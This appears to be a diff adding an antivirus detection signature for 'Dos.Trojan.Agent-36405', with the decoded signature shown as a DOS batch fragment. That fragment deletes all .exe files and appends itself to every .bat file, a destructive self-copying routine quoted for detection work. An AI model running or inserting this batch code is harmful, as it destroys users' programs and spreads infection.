@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36405
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off @ctty nul @del *.exe @for %%f in (*.bat) do copy %%f + finekill.bat @ctty con 
